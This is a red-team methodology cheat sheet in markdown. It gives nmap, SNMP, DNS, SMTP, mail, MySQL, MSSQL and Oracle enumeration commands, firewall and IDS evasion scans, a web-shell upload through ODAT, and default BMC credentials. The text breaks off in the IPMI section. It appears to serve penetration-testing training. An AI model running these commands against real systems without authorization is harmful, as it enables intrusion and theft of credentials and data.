# Red Team Methodology

## Method Map

- `1` **Host Discovery**
  - `1.1` **Local-network discovery**
    - `1.1.1` **ARP**
      - `1.1.1.1` arp-scan
      - `1.1.1.2` Netdiscover
    - `1.1.2` ICMP range sweep
  - `1.2` **Routed-network discovery**
    - `1.2.1` **Nmap**
      - `1.2.1.1` TCP SYN probes
      - `1.2.1.2` TCP ACK probes
      - `1.2.1.3` UDP service probes
      - `1.2.1.4` Host-only sweep
- `2` **Port Scanning & Service Enumeration**
  - `2.1` **Nmap**
    - `2.1.1` Aggressive all-port scan
    - `2.1.2` SYN stealth with default scripts
    - `2.1.3` **IDS/IPS evasion**
      - `2.1.3.1` Decoy scan (-D RND)
      - `2.1.3.2` Spoofed source IP (-S)
      - `2.1.3.3` DNS source port (--source-port 53)
  - `2.2` **SNMP Enumeration**
    - `2.2.1` snmpwalk community string query
    - `2.2.2` onesixtyone community string brute force
    - `2.2.3` braa bulk MIB walk / community string brute force
  - `2.3` **Web Content Discovery**
    - `2.3.1` gobuster directory enumeration
    - `2.3.2` gobuster DNS subdomain enumeration
    - `2.3.3` curl banner grabbing
    - `2.3.4` whatweb technology fingerprinting
    - `2.3.5` ncat banner grabbing
    - `2.3.6` crt.sh certificate transparency log query
  - `2.4` **Vulnerability Assessment**
    - `2.4.1` Nmap NSE --script vuln
  - `2.5` **DNS Enumeration**
    - `2.5.1` dig version.bind CHAOS TXT
    - `2.5.3` dnsenum subdomain brute force
    - `2.5.4` dig recursive zone enumeration
  - `2.6` **SMTP Enumeration**
    - `2.6.1` smtp-user-enum username enumeration
  - `2.7` **IMAP / POP3 Enumeration**
    - `2.7.1` email-dumper automated IMAP/POP3 dumping
  - `2.8` **MySQL Database Enumeration**
    - `2.8.1` mysqldump database dump (self-signed TLS)
  - `2.9` **MSSQL Database Enumeration**
    - `2.9.1` impacket-mssqlclient connection & auth modes
    - `2.9.2` List non-default databases
  - `2.10` **Oracle TNS Enumeration**
    - `2.10.1` odat.py all-modules enumeration
    - `2.10.2` sqlplus connection as sysdba
    - `2.10.3` odat.py UTL_FILE web shell upload
  - `2.11` **IPMI Enumeration**
    - `2.11.1` Metasploit IPMI hash dump
    - `2.11.2` John the Ripper RAKP hash cracking
- `3` **Initial Attack Vectors**
  - `3.1` **LLMNR/NBT-NS Poisoning**
    - `3.1.1` Responder hash capture
    - `3.1.2` Cracking NTLMv2 hashes
  - `3.2` **SMB Relay Attack**
    - `3.2.1` Enumerate SMB signing
    - `3.2.2` Responder relay configuration
    - `3.2.3` impacket-ntlmrelayx
  - `3.3` **IPv6 mitm6 Attack**
    - `3.3.1` mitm6
    - `3.3.2` impacket-ntlmrelayx (IPv6 relay)
   - `3.4` **SMB Share Enumeration**
     - `3.4.1` smbclient share listing
     - `3.4.2` crackmapexec share enumeration
     - `3.4.3` rpcclient null session enumeration
     - `3.4.4` enum4linux-ng enumeration
     - `3.4.5` smbmap share enumeration
  - `3.5` **SMB Share File-Based Attacks**
    - `3.5.1` Upload .scf / .lnk files
- `4` **Lateral Movement & Shell Access**
  - `4.1` **Impacket**
    - `4.1.1` impacket-psexec
    - `4.1.2` impacket-wmiexec
    - `4.1.3` impacket-smbexec
  - `4.2` **Metasploit**
    - `4.2.1` psexec module
  - `4.3` **RDP**
    - `4.3.1` xfreerdp
  - `4.4` **Shell Access**
    - `4.4.1` Reverse shells
    - `4.4.2` Bind shells
    - `4.4.3` Web shells
    - `4.4.4` TTY upgrade
    - `4.4.5` Base64 file transfer
- `5` **Active Directory Enumeration**
  - `5.1` ldapdomaindump
  - `5.2` BloodHound
  - `5.3` PlumHound
  - `5.4` impacket-samrdump
  - `5.5` impacket-lookupsid
- `6` **Credential Attacks**
  - `6.1` **crackmapexec Suite**
    - `6.1.1` Credential validation
    - `6.1.2` SAM / LSA dump
    - `6.1.3` LSASS dump (lsassy)
    - `6.1.4` Password spraying
    - `6.1.5` Local authentication & cmedb
  - `6.2` **impacket-secretsdump**
  - `6.3` **Kerberoasting**
    - `6.3.1` impacket-GetUserSPNs
    - `6.3.2` Cracking TGS hashes
  - `6.4` **Token Impersonation**
  - `6.5` **Credential Dumping**
    - `6.5.1` Mimikatz
    - `6.5.2` LSASS dump (Task Manager)
    - `6.5.3` LSASS dump (procdump)
  - `6.6` **GPP / cPassword Attacks**
- `7` **Persistence & Domain Dominance**
  - `7.1` **User and Group Manipulation**
  - `7.2` Dumping NTDS.dit
  - `7.3` Golden Ticket Attack
- `8` **Privilege Escalation**
  - `8.1` **Automated Enumeration**
    - `8.1.1` LinPEAS
    - `8.1.2` WinPEAS
  - `8.2` **Linux — Manual Checks**
    - `8.2.1` Kernel version & exploits
    - `8.2.2` Sudo privileges
    - `8.2.3` SUID / SGID binaries
    - `8.2.4` Cron jobs
    - `8.2.5` Exposed credentials
    - `8.2.6` SSH keys
    - `8.2.7` Writable PATH directories
    - `8.2.8` Installed software
    - `8.2.9` NFS no_root_squash privilege escalation
  - `8.3` **Privesc Resources**
- `9` **Useful Resources**

## 1. Host Discovery

### 1.1 Local-network discovery

#### 1.1.1 ARP

##### 1.1.1.1 arp-scan

```bash
sudo arp-scan -I <INTERFACE> --localnet
```

<details>
<summary>Details</summary>

**Description**

- Sends ARP requests to find active IPv4 hosts on the selected local Layer 2 network.
- Records IP, MAC, and vendor information for responding hosts.

**Parameters**

- `-I <INTERFACE>` — Selects the network interface to use.
- `--localnet` — Derives the target range from that interface's IP address and netmask.

</details>

##### 1.1.1.2 Netdiscover

```bash
sudo netdiscover -i <INTERFACE> -r <IP/MASK>
```

<details>
<summary>Details</summary>

**Description**

- Sends ARP requests across a specified local subnet.
- Can also be used for passive ARP reconnaissance.

**Parameters**

- `-i <INTERFACE>` — Selects the interface for ARP traffic.
- `-r <IP/MASK>` — Sets the local CIDR range to scan.

</details>

#### 1.1.2 ICMP range sweep

```bash
fping -a -g <IP/MASK> 2>/dev/null
```

<details>
<summary>Details</summary>

**Description**

- Lists addresses that answer ICMP echo requests.
- A missing reply does not prove that a host is offline.

**Parameters**

- `-a` — Shows only hosts that respond.
- `-g` — Generates addresses from the supplied CIDR range.
- `<IP/MASK>` — Target CIDR range.
- `2>/dev/null` — Suppresses error output from the shell.

</details>

### 1.2 Routed-network discovery

#### 1.2.1 Nmap

##### 1.2.1.1 TCP SYN probes

```bash
sudo nmap -sn -PS22,80,443 <IP/MASK>
```

<details>
<summary>Details</summary>

**Description**

- Sends TCP SYN packets to the specified ports to elicit a response from live hosts.
- A SYN-ACK or RST response indicates the host is up.

**Parameters**

- `-sn` — Performs host discovery without a port scan.
- `-PS22,80,443` — Sends TCP SYN probes to the listed ports.
- `<IP/MASK>` — Target host or CIDR range.

</details>

##### 1.2.1.2 TCP ACK probes

```bash
sudo nmap -sn -PA80,443 <IP/MASK>
```

<details>
<summary>Details</summary>

**Description**

- Sends TCP ACK packets to the specified ports, prompting a RST response from live hosts.
- Often bypasses stateless firewalls that filter SYN but not ACK packets.

**Parameters**

- `-sn` — Performs host discovery without a port scan.
- `-PA80,443` — Sends TCP ACK probes to the listed ports.
- `<IP/MASK>` — Target host or CIDR range.

</details>

##### 1.2.1.3 UDP service probes

```bash
sudo nmap -sn -PU53,123,161 <IP/MASK>
```

<details>
<summary>Details</summary>

**Description**

- Uses UDP probes to elicit responses from common infrastructure services.
- Helps identify hosts that do not answer ICMP or TCP discovery probes.
- Port 53 (DNS), 123 (NTP — Network Time Protocol), and 161 (SNMP — Simple Network Management Protocol) are commonly open on infrastructure devices.

**Parameters**

- `-sn` — Performs host discovery without a port scan.
- `-PU53,123,161` — Sends UDP probes to the listed ports.
- `<IP/MASK>` — Target host or CIDR range.

</details>

##### 1.2.1.4 Host-only sweep

```bash
nmap -sn -n <IP/MASK>
```

<details>
<summary>Details</summary>

**Description**

- Performs Nmap host discovery without a port scan.
- Disables reverse DNS lookups for cleaner, faster output.

**Parameters**

- `-sn` — Performs host discovery without a port scan.
- `-n` — Disables reverse DNS resolution.
- `<IP/MASK>` — Target host or CIDR range.

</details>

## 2. Port Scanning & Service Enumeration

### 2.1 Nmap

#### 2.1.1 Aggressive all-port scan

```bash
nmap -T4 -p- -A <IP/MASK>
```

<details>
<summary>Details</summary>

**Description**

- Scans all 65535 TCP ports with aggressive timing and full-featured detection.
- Performs OS detection, version detection, script scanning, and traceroute.

**Parameters**

- `-T4` — Aggressive timing template for faster scanning.
- `-p-` — Scans all TCP ports (1–65535).
- `-A` — Enables OS detection, version detection, script scanning, and traceroute.
- `<IP/MASK>` — Target host or CIDR range.

</details>

#### 2.1.2 SYN stealth with default scripts

```bash
nmap -T4 -p- -sS -sC <IP/MASK>
```

<details>
<summary>Details</summary>

**Description**

- Performs a TCP SYN stealth scan across all ports and runs default NSE scripts.
- Combines fast timing with service discovery and basic vulnerability enumeration.

**Parameters**

- `-T4` — Aggressive timing template.
- `-p-` — Scans all TCP ports (1–65535).
- `-sS` — TCP SYN stealth scan (half-open, default root scan type).
- `-sC` — Runs default NSE scripts against discovered services.
- `<IP/MASK>` — Target host or CIDR range.

</details>

#### 2.1.3 IDS/IPS evasion

##### 2.1.3.1 Decoy scan (-D RND)

```bash
sudo nmap <TARGET_IP> -p <PORT> -sS -Pn -n --disable-arp-ping -D RND:5
```

<details>
<summary>Details</summary>

**Description**

- Nmap generates random IP addresses inserted into the IP header to disguise the origin of the scan.
- The real IP is randomly placed among the decoys, making it harder for an IPS to pinpoint and block the attacker.
- Decoys must be alive — if they are down, the target may treat the traffic as a SYN flood and drop replies.
- Works with SYN, ACK, ICMP, and OS detection scans.

**Parameters**

- `-sS` — SYN stealth scan.
- `-Pn` — Disables ICMP echo discovery.
- `-n` — Disables DNS resolution.
- `--disable-arp-ping` — Prevents ARP probes.
- `-D RND:5` — Generates five random decoy IPs; the real IP is placed randomly among them.

**Reference:** https://nmap.org/book/man-bypass-firewalls-ids.html

</details>

##### 2.1.3.2 Spoofed source IP (-S)

```bash
sudo nmap <TARGET_IP> -n -Pn -p <PORT> -O -S <SPOOFED_IP> -e <INTERFACE>
```

<details>
<summary>Details</summary>

**Description**

- Spoofs the source IP to impersonate a trusted host or test firewall rules from a different subnet perspective.
- Useful when a specific IP range is whitelisted — a port shown as `filtered` from your real IP may appear `open` when spoofing an internal or trusted address.
- Requires the `-e` flag to bind the scan to the interface that can route the spoofed IP.

**Parameters**

- `-n` — Disables DNS resolution.
- `-Pn` — Disables ICMP echo discovery.
- `-O` — Enables OS detection.
- `-S <SPOOFED_IP>` — Source IP to impersonate.
- `-e <INTERFACE>` — Network interface to send packets through (e.g. `tun0`).

**Reference:** https://nmap.org/book/man-bypass-firewalls-ids.html

</details>

##### 2.1.3.3 DNS source port (--source-port 53)

```bash
sudo nmap <TARGET_IP> -p <PORT> -sS -Pn -n --disable-arp-ping --source-port 53
```

<details>
<summary>Details</summary>

**Description**

- Port 53 (DNS) is almost never filtered — firewalls assume it's legitimate name resolution traffic.
- By setting `--source-port 53`, scan packets appear as DNS traffic, bypassing firewall rules that would otherwise block the target port.
- **Limitation:** `--source-port` only applies to raw socket scans (`-sS`, `-sA`, `-sU`). It does **not** affect version detection (`-sV`), NSE scripts, or TCP connect scans (`-sT`) — those use the OS `connect()` syscall with ephemeral ports. Use `ncat --source-port 53` or `iptables` SNAT rules to force the source port for those.

**Parameters**

- `-sS` — SYN stealth scan.
- `-Pn` — Disables ICMP echo discovery.
- `-n` — Disables DNS resolution.
- `--disable-arp-ping` — Prevents ARP probes.
- `--source-port 53` — Sets the source port to 53 (DNS), making the traffic appear as DNS queries.

**Reference:** https://nmap.org/book/man-bypass-firewalls-ids.html

</details>

### 2.2 SNMP Enumeration

#### 2.2.1 snmpwalk community string query

```bash
snmpwalk -v 2c -c <COMMUNITY_STRING> <TARGET_IP> <OID>
```

<details>
<summary>Details</summary>

**Description**

- Queries an SNMP-enabled device for information using the specified community string and OID.
- SNMPv1 and v2c send community strings in plaintext — no encryption or authentication.
- Common default community strings: `public` (read-only) and `private` (read-write).
- Useful OIDs: `1.3.6.1.2.1.1.5.0` (hostname), `1.3.6.1.2.1.25.4.2.1.2` (running processes — may reveal credentials in command-line arguments).
- Enumerate a full OID tree with `1.3.6.1.2.1` as the target.

**Parameters**

- `-v 2c` — SNMP version 2c.
- `-c <COMMUNITY_STRING>` — Community string (e.g. `public`, `private`).
- `<TARGET_IP>` — Target device IP.
- `<OID>` — Object Identifier to query; omit to walk the full tree.

</details>

#### 2.2.2 onesixtyone community string brute force

```bash
onesixtyone -c <DICT_FILE> <TARGET_IP>
```

<details>
<summary>Details</summary>

**Description**

- Brute-forces SNMP community string names using a dictionary of common strings.
- The tool's GitHub repository includes a `dict.txt` file with commonly used community strings.
- Prefer SecLists' more comprehensive list at `/usr/share/seclists/Discovery/SNMP/snmp.txt` (or `/opt/useful/seclists/...`).
- Once a valid community string is found, use `snmpwalk` or `braa` to enumerate the device.

**Parameters**

- `-c <DICT_FILE>` — Dictionary file containing community strings, one per line (e.g. `snmp.txt` from SecLists).
- `<TARGET_IP>` — Target device IP.

**Reference:** [onesixtyone GitHub](https://github.com/trailofbits/onesixtyone)

</details>

#### 2.2.3 braa bulk MIB walk / community string brute force

```bash
braa <COMMUNITY_STRING>@<TARGET_IP>:.1.3.6.*
```

<details>
<summary>Details</summary>

**Description**

- Bulk-walks a full OID tree in a single fast pass, querying the specified subtree (e.g. `1.3.6.1.2.1` or `1.3.6.*`) without needing individual OID lookups.
- Faster than `snmpwalk` for large enumerations because it parallelizes requests and walks the MIB tree sequentially with minimal overhead.
- Can also brute-force the OID subtree when the target MIB is unknown.
- Like other SNMPv1/v2c tools, requires the community string; pair it with `onesixtyone` to discover the string first.

**Parameters**

- `<COMMUNITY_STRING>` — Community string (e.g. `public`, `private`).
- `<TARGET_IP>` — Target device IP.
- `.1.3.6.*` — Root OID to walk; any subtree under `1.3.6` can be targeted.

</details>

### 2.3 Web Content Discovery

#### 2.3.1 gobuster directory enumeration

```bash
gobuster dir -u <TARGET_URL> -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

<details>
<summary>Details</summary>

**Description**

- Brute-forces hidden directories and files on a web server using a wordlist.
- Reveals resources not intended for public access — admin panels, backup files, configuration leaks, or CMS installations.
- Seclists is assumed installed (`/usr/share/seclists/`); common wordlists include `common.txt`, `directory-list-2.3-medium.txt`, and `raft-large-directories.txt`.

**Parameters**

- `dir` — Directory/file brute-forcing mode.
- `-u <TARGET_URL>` — Target base URL (e.g. `http://10.10.10.121/`).
- `-w <WORDLIST>` — Path to the wordlist file.

**Useful HTTP Status Codes**

| Code | Meaning |
|---|---|
| 200 | OK — resource is accessible |
| 301 | Redirect — resource moved, often points to a real path |
| 403 | Forbidden — resource exists but access is denied |
| 401 | Unauthorised — authentication required |

</details>

#### 2.3.2 gobuster DNS subdomain enumeration

```bash
gobuster dns -d <DOMAIN> -w /usr/share/seclists/Discovery/DNS/namelist.txt
```

<details>
<summary>Details</summary>

**Description**

- Enumerates subdomains of a given domain using a DNS wordlist.
- Useful for discovering hidden admin panels, staging environments, or internal applications exposed externally.
- Ensure a DNS server is configured in `/etc/resolv.conf` (e.g. `1.1.1.1`).

**Parameters**

- `dns` — DNS subdomain brute-forcing mode.
- `-d <DOMAIN>` — Target domain (e.g. `inlanefreight.com`).
- `-w <WORDLIST>` — Path to the DNS wordlist (e.g. `/usr/share/seclists/Discovery/DNS/namelist.txt`).

</details>

#### 2.3.3 curl banner grabbing

```bash
curl -IL <TARGET_URL>
```

<details>
<summary>Details</summary>

**Description**

- Retrieves HTTP response headers from a web server, revealing the server software, framework, and security headers.
- `-I` — Fetch only the HTTP response headers (HEAD request).
- `-L` — Follow redirects, showing headers for the final destination.
- Common findings: `Server` header (Apache/nginx version), `X-Powered-By` (PHP/ASP.NET), `Set-Cookie` (session handling), missing security headers (e.g. `Content-Security-Policy`).

</details>

#### 2.3.4 whatweb technology fingerprinting

**Single target:**

```bash
whatweb <TARGET_IP>
```

**CIDR range (suppress errors):**

```bash
whatweb --no-errors <IP/MASK>
```

<details>
<summary>Details</summary>

**Description**

- Identifies web technologies in use: server type, framework, CMS, JavaScript libraries, and analytics.
- Useful for quickly mapping multiple hosts on a subnet to identify interesting targets.
- Detects WordPress, Joomla, specific PHP versions, nginx vs Apache, and more without making many requests.

**Parameters**

- `--no-errors` — Suppress error messages when scanning multiple hosts.
- `<TARGET_IP>` — Single IP or CIDR range.

</details>

#### 2.3.5 ncat banner grabbing

```bash
ncat -nv <TARGET_IP> <PORT>
```

**With source port spoofing (firewall bypass):**

```bash
sudo ncat -nv --source-port 53 <TARGET_IP> <PORT>
```

<details>
<summary>Details</summary>

**Description**

- Connects to an open port and reads the service banner, revealing the software name and version.
- Useful when Nmap `-sV` fails to identify the service or as a quick manual check.
- Works with any TCP service that sends a banner on connect (HTTP, FTP, SMTP, SSH, etc.).
- The `--source-port` variant makes the connection originate from port 53, bypassing firewalls that trust DNS traffic.

**Parameters**

- `-n` — Disables DNS resolution.
- `-v` — Verbose output (shows the connection and banner).
- `--source-port 53` — Sets the source port to 53 (DNS); use `sudo` to bind privileged ports.
- `<TARGET_IP>` — Target IP address.
- `<PORT>` — Target port to connect to.

</details>

#### 2.3.6 crt.sh certificate transparency log query

```bash
curl -s "https://crt.sh/?q=<DOMAIN>&output=json" | jq -r '.[].name_value' | sort -u
```

<details>
<summary>Details</summary>

**Description**

- Pulls subdomain names from Certificate Transparency (CT) logs via the crt.sh database (RFC 6962).
- CT is a public, auditable log of every TLS certificate issued by certificate authorities, so this surfaces real subdomains without touching the target.
- Passive and stealthy: no traffic hits the target — great for initial recon before active scans.
- Wildcard certs return `*.example.com`; deduplicate with `sort -u`.
- For a single base domain, add `&exclude=expired` to filter out expired certs, or use the `%25` wildcard: `https://crt.sh/?q=%25.example.com` to catch subdomains of subdomains.

**Parameters**

- `-s` — Silent mode (no progress bar).
- `-q <DOMAIN>` — Target domain (e.g. `example.com`).
- `output=json` — Returns machine-readable JSON instead of HTML.
- `jq -r '.[].name_value'` — Extracts the subject name(s) from each cert entry.
- `sort -u` — Deduplicates and sorts the resulting subdomain list.

**Reference:** https://crt.sh

</details>

### 2.4 Vulnerability Assessment

#### 2.4.1 Nmap NSE --script vuln

```bash
sudo nmap <TARGET_IP> -p <PORT> -sV --script vuln
```

<details>
<summary>Details</summary>

**Description**

- Runs all NSE scripts in the `vuln` category against the specified service.
- Interacts with the target service, inspects version banners, and cross-references vulnerability databases to surface known CVEs, default credentials, and web application weaknesses.
- Nmap offers many other NSE categories; see the full list at https://nmap.org/nsedoc/index.html

**Parameters**

- `-p <PORT>` — Specifies the port to scan (e.g. `80`).
- `-sV` — Enables service version detection.
- `--script vuln` — Executes all NSE scripts belonging to the vulnerability category.

**Reference:** https://nmap.org/nsedoc/index.html

</details>

### 2.5 DNS Enumeration

#### 2.5.1 dig version.bind CHAOS TXT

```bash
dig @<TARGET_IP> version.bind CHAOS TXT
```

<details>
<summary>Details</summary>

**Description**

- Queries the DNS server for its version string via the `version.bind` pseudo-domain in the CHAOS class.
- Most DNS servers (BIND, dnsmasq, etc.) respond with their daemon version — useful for identifying outdated software.
- Passive enough to blend in; much faster than an Nmap service scan on UDP 53.

**Parameters**

- `@<TARGET_IP>` — DNS server to query.
- `version.bind` — Pseudo-domain that BIND and most DNS servers expose for version disclosure.
- `CHAOS` — Query class (CH) repurposed by BIND as an internal management channel.
- `TXT` — Record type; the version is returned as a TXT resource record.

**Fallback (if dig returns nothing):**

```bash
sudo nmap <TARGET_IP> -p 53 -sU -sV -Pn -n
```

</details>

#### 2.5.3 dnsenum subdomain brute force

```bash
dnsenum --dnsserver <TARGET_IP> --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt <DOMAIN>
```

<details>
<summary>Details</summary>

**Description**

- Automated DNS enumeration: resolves host addresses, name servers, MX records, attempts zone transfers (AXFR), and brute-forces subdomains.
- Performs the same class of brute-force queries as a manual `dig` loop, in one command.

**Parameters**

- `--dnsserver <TARGET_IP>` — DNS server to query.
- `--enum` — Run all enumeration functions.
- `-p 0` — Skip TCP port scanning (scans 0 ports).
- `-s 0` — Skip reverse DNS lookups for subdomains.
- `-o subdomains.txt` — Write results to a file.
- `-f <WORDLIST>` — Subdomain wordlist to brute-force with.
- `<DOMAIN>` — Base domain.

**Recommended wordlists**

| Wordlist | Characteristics |
|---|---|
| `subdomains-top1million-110000.txt` | Real-world subdomains ranked by popularity (www, api, blog, dev, mail). Good general coverage. |
| `fierce-hostlist.txt` | Curated list heavy on internal/AD-style hostnames (win2k, dc1, wsus, exchange) often absent from popularity lists. Run as a second pass — different lists hit different names. |

</details>

#### 2.5.4 dig recursive zone enumeration

```bash
for sub in <SUBDOMAIN_LIST>; do echo "=== $sub.<DOMAIN> ==="; for type in AXFR TXT A SOA ANY; do dig @<DNS_IP> "$sub.<DOMAIN>" "$type" +noall +answer; done; done
```

<details>
<summary>Details</summary>

**Description**

- Any discovered subdomain can itself be a zone with its own NS, SOA, AXFR, and hidden subdomains. This loops through the list and queries every record type against each name.
- Collect the newly surfaced hosts from the output, append them to the list, and **run the loop again** — repeat until no new names appear.
- Single queries (A/TXT/ANY) may return empty for a zone while AXFR dumps everything intact, so AXFR is the priority.

**Parameters**

- `+noall` — Suppresses all dig output sections (header, comments, statistics).
- `+answer` — Re-enables only the answer section, showing just the resolved records.
- `<DNS_IP>` — DNS server to query.
- `<DOMAIN>` — Base domain.
- `<SUBDOMAIN_LIST>` — Space-separated subdomain names. Start with the base domain and any hits from the AXFR or `2.5.3` brute-force. After each pass, add every newly discovered name and re-run.

</details>

### 2.6 SMTP Enumeration

#### 2.6.1 smtp-user-enum username enumeration

```bash
smtp-user-enum -M RCPT -U <WORDLIST> -t <TARGET_IP> -v -w20
```

<details>
<summary>Details</summary>

**Description**

- Enumerates valid SMTP usernames by sending a probe for each name in the wordlist and comparing the server's response code.
- **Prefer `-M RCPT` over `-M VRFY`:** many MTAs return `252` for *every* VRFY query — even for users that don't exist — so VRFY-based enumeration reports false positives (every name looks valid). The `RCPT TO:` check is a more reliable validity oracle (valid → `250`, invalid → `550`).
- Works over a single session using PIPELINING, so it's fast on large wordlists.

**Parameters**

- `-M RCPT` — Enumeration method: `VRFY`, `EXPN`, or `RCPT`. Use `RCPT` unless VRFY is confirmed reliable.
- `-U <WORDLIST>` — Path to the username list (one per line).
- `-t <TARGET_IP>` — Target SMTP server.
- `-v` — Verbose output.
- `-w20` — Wait up to 20 seconds for a response; some SMTP servers respond slowly on purpose to foil enumeration.

**Enumeration methods**

| Method | Command | What it tells you |
|---|---|---|
| `VRFY` | `VRFY <user>` | Confirms whether a username exists — but often masked with `252` for every name (false positives). |
| `EXPN` | `EXPN <name>` | Expands aliases / mailing lists to reveal the real recipient addresses behind them (e.g. `EXPN root` → `250 ed.williams@host`). Only works if the server advertises it — otherwise `502 command not recognized`. |
| `RCPT TO` | `MAIL FROM:<x>` then `RCPT TO:<user>` | Most reliable validity check: `250` = accepted, `550` = user unknown in local recipient table. |

**Recommended wordlists**

- **HTB Academy footprinting wordlist** (`footprinting-wordlist.txt`) — employee-name based; only distributed inside the Academy module (Resources tab), not a public download.
- **Metasploit default** (`/usr/share/metasploit-framework/data/wordlists/namelist.txt`) — ~88k real first/last names; ships with Kali/Parrot.
- **SecLists** (`/usr/share/seclists/Usernames/Names/names.txt`) — general name list; install with `apt install seclists`.

**Reference:** https://pentestmonkey.net/tools/user-enumeration/smtp-user-enum

</details>

### 2.7 IMAP / POP3 Enumeration

#### 2.7.1 email-dumper automated IMAP/POP3 dumping

```bash
git clone https://github.com/Sirbu-Boeti-Eduard/email-dumper
cd email-dumper
python3 email_dumper.py --host <TARGET_IP> --username <USER> --password <PASS> --ssl --insecure
```

<details>
<summary>Details</summary>

**Description**

- Automated IMAP and POP3 dumping: given valid credentials, pulls every message from all mailboxes to local `.eml` files for offline review.
- Works for IMAP (143/plaintext/STARTTLS), IMAPS (993), POP3 (110/plaintext/STARTTLS), POP3S (995).
- `--insecure` skips SSL cert verification — required for lab/CTF servers with self-signed certs.

**Parameters**

- `--host <TARGET_IP>` — Mail server.
- `--username <USER>` / `--password <PASS>` — Credentials (often the user validated via SMTP user enumeration).
- `--ssl` — Implicit TLS (993/995).
- `--starttls` — Upgrade plaintext port with STARTTLS (use if `--ssl` fails with a handshake error).
- `--pop3` — Use POP3 instead of IMAP.
- `--insecure` — Skip cert verification for self-signed certs.
- `--dump-folder <DIR>` — Output directory (default `dumped_mails`).

**Reference:** https://github.com/Sirbu-Boeti-Eduard/email-dumper

</details>

### 2.8 MySQL Database Enumeration

#### 2.8.1 mysqldump database dump (self-signed TLS)

```bash
mysqldump -h <TARGET_IP> -u <USER> -p<PASS> --ssl --ssl-verify-server-cert=0 --all-databases > dump.sql
```

<details>
<summary>Details</summary>

**Description**

- Dumps every database to a `.sql` file for offline review.
- `--ssl` forces a TLS connection; `--ssl-verify-server-cert=0` skips certificate verification so self-signed/lab certs are accepted.

**Parameters**

- `-h <TARGET_IP>` — Database host.
- `-u <USER>` / `-p<PASS>` — Credentials (no space after `-p`).
- `--ssl` — Enable TLS.
- `--ssl-verify-server-cert=0` — Skip cert verification (self-signed/lab certs).
- `--all-databases` — Dump every database.

</details>

### 2.9 MSSQL Database Enumeration

#### 2.9.1 impacket-mssqlclient connection & auth modes

```bash
impacket-mssqlclient <USER>:<PASS>@<TARGET_IP> -windows-auth
```

<details>
<summary>Details</summary>

**Description**

- Interactive MSSQL client. Add `-windows-auth` when the credentials are a Windows domain account — without it the tool tries SQL Server authentication (local SQL logins) and fails.
- SQL Server supports two auth modes: **SQL logins** (stored in the server, e.g. `sa`) and **Windows logins** (validated by the domain via NTLM). If the user isn't a local SQL login, you must use `-windows-auth`.

**Parameters**

- `<USER>:<PASS>@<TARGET_IP>` — Credentials and target host.
- `-windows-auth` — Use Windows Integrated Authentication (NTLM) instead of SQL Server authentication.

</details>

#### 2.9.2 List non-default databases

```sql
SELECT name FROM sys.databases WHERE name NOT IN ('master','tempdb','model','msdb');
```

<details>
<summary>Details</summary>

**Description**

- Lists all user-created databases by excluding the four default system databases.
- Run inside the `impacket-mssqlclient` interactive shell.

</details>

### 2.10 Oracle TNS Enumeration

<details>
<summary>ODAT installation</summary>

```bash
sudo apt-get update
sudo apt-get install -y build-essential python3-dev libaio1
cd ~
wget https://files.pythonhosted.org/packages/source/c/cx_Oracle/cx_Oracle-8.3.0.tar.gz
tar xzf cx_Oracle-8.3.0.tar.gz
cd cx_Oracle-8.3.0
python3 setup.py build
sudo python3 setup.py install
cd ~
git clone https://github.com/quentinhardy/odat.git
cd odat/
pip install python-libnmap
git submodule init
git submodule update
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor passlib python-libnmap
sudo apt-get install build-essential libgmp-dev -y
pip3 install pycryptodome
pip3 install openpyxl
```

</details>

<details>
<summary>sqlplus installation</summary>

```bash
sudo apt update
sudo apt upgrade parrot-core
sudo apt update
sudo apt install oracle-instantclient-sqlplus
```

If you get `sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file`:

```bash
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf"
sudo ldconfig
```

</details>

#### 2.10.1 odat.py all-modules enumeration

```bash
./odat.py all -s <TARGET_IP>
```

<details>
<summary>Details</summary>

**Description**

- ODAT (Oracle Database Attack Tool) runs all available modules against the target: SID brute force, account brute force, privilege escalation, code execution, file upload/download, and more.
- Combines discovery, credential testing, and exploitation into a single pass.

**Parameters**

- `all` — Execute every ODAT module.
- `-s <TARGET_IP>` — Target Oracle TNS listener.

</details>

#### 2.10.2 sqlplus connection as sysdba

```bash
sqlplus <USER>/<PASS>@<TARGET_IP>/<SID> as sysdba
```

<details>
<summary>Details</summary>

**Description**

- Connects to an Oracle database with sysdba privileges.
- Common default credentials: `scott/tiger`, `system/manager`, `sys/change_on_install`.
- `<SID>` is the Oracle System Identifier (e.g. `XE` for Oracle Express Edition).
- `as sysdba` elevates the session to the highest privilege level — required for file system operations via UTL_FILE.

**Parameters**

- `sqlplus` — Oracle's native SQL client.
- `<USER>/<PASS>` — Credentials.
- `<TARGET_IP>/<SID>` — Listener address and database SID.
- `as sysdba` — Authenticate as system database administrator.

</details>

#### 2.10.3 odat.py UTL_FILE web shell upload

```bash
./odat.py utlfile -s <TARGET_IP> -d <SID> -U <USER> -P <PASS> --sysdba --putFile <REMOTE_PATH> <REMOTE_FILE> <LOCAL_FILE>
```

<details>
<summary>Details</summary>

**Description**

- Leverages Oracle's UTL_FILE package to write a file to disk on the database server (e.g. a web shell into `C:\inetpub\wwwroot`).
- Requires sysdba privileges.
- The file is written to a directory accessible to the Oracle service account.

**Parameters**

- `utlfile` — ODAT module for UTL_FILE read/write operations.
- `-s <TARGET_IP>` — Target Oracle TNS listener.
- `-d <SID>` — Database SID (e.g. `XE`).
- `-U <USER>` / `-P <PASS>` — Credentials.
- `--sysdba` — Use sysdba privilege.
- `--putFile <REMOTE_PATH> <REMOTE_FILE> <LOCAL_FILE>` — Write `<LOCAL_FILE>` to `<REMOTE_PATH>` on the target as `<REMOTE_FILE>`.

</details>

### 2.11 IPMI Enumeration

BMC (Baseboard Management Controller) interfaces often ship with unchanged default passwords.

**Default credentials**

| Product | Username | Password |
|---|---|---|
| Dell iDRAC | `root` | `calvin` |
| HP iLO | `Administrator` | Randomized 8-char uppercase + digits |
| Supermicro IPMI | `ADMIN` | `ADMIN` |

#### 2.11.1 Metasploit IPMI hash dump

```bash
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
msf6 > set rhosts <TARGET_IP>
msf6 > set output_john_file /tmp/ipmi_john.hash
